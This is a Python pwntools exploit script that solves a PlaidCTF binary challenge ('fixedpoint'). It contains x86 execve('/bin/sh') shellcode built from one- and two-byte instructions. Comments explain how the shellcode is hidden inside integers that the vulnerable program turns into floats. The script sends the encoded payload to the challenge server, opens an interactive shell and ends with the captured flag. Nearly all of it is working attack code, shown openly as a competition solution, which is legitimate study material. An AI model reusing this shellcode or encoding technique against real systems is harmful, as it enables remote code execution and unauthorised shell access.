import struct
import ctypes
from pwn import *

# Our shellcode.
# It's important that it uses only 1 or 2 bytes per instruction
# It's pretty fun figuring out how to do it with only 2 byte instructions ;)
# Basic execve for /bin/sh
shellcode = ["\x31\xc9", # xor ecx, ecx
             "\xf7\xe1", # mul ecx
             "\x51", # push ecx
             "\xb1\xff", # mov cl, 0xFF
             "\xb5\xff", # mov ch, 0xFF
             "\x41", # inc ecx
             "\xb4\x68", # mov ah, 0x68
             "\xb0\x73", # mov al, 0x73
             "\xf7\xe1", # mul ecx
             "\xb4\x2f", # mov ah, 0x2F
             "\xb0\x2f", # mov al, 0x2F
             "\x50", # push eax
             "\xb4\x6e", # mov ah, 0x6e
             "\xb0\x69", # mov al, 0x69
             "\xf7\xe1", # mul ecx
             "\xb4\x62", # mov ah, 0x62
             "\xb0\x2f", # mov al, 0x2F
             "\x50", # push eax
             "\x31\xc0", # xor eax, eax
             "\x31\xd2", # xor edx, edx
             "\x31\xc9", # xor ecx, ecx
             "\x89\xe3", # mov ebx, esp
             "\xb0\x0b", # mov al, 11
             "\xcd\x80"] # int 0x80

ints_to_send = []

# So each instruction is encoded like so:
# Each line is read from the program as an integer
# The int then converted into an IEEE 754 single-precision float and divided by 1337
# Lastly, all of resulting floats are placed in an array and executed directly
#
# Our job is to come up with a way to encode valid opcodes into these floats
# I accomplished this by determining that the opcode 0x48 (inc eax) creates an
# exponent of 2^18 if placed in the most-significant byte. Also, the opcode 
# 0x40 (dec eax) in the least-significant byte will cause the Mantissa to
# align the float to an integer. If you notice, this means that any two opcodes
# can be executed, and the 'int eax' and 'dec eax' cancel each other out. Perfect!

# Each of the instructions are encoded between the bytes 0x48 and 0x40. 
# If it's a single opcode, add a NOP (0x90) just for padding.

for instr in shellcode:
    z = "\x40"
    if len(instr) == 1:
        z = "\x90\x40"

    # Make the floating-point payload
    payload = "\x48" + instr[::-1] + z

    # 'unpack' the payload into a float and multiply it by 1337
    a = struct.unpack(">f", payload)[0]*1337

    # Check if it will overflow, quit if it does (it won't)
    if a > 2147483647:
        log.error("It's too large fam.")

    # Remove the floating point part from the integer
    b = str("{0:f}".format(a)).split(".")[0]

    # Print out the integer and the hex
    log.info(b + " " + payload.encode("hex"))

    # Lastly, prepare to send it
    ints_to_send.append(b)

#p = process("./fixedpoint-pwn175")
p = remote("fixedpoint.pwning.xxx", 7777)
# Send each integer payload
for i in ints_to_send:
    p.sendline(i)

# Execute payload
p.sendline("begin")
p.recvline()

# Begin shell
p.interactive()

# Done! Flag: PCTF{why_isnt_IEEE_754_IEEE_7.54e2}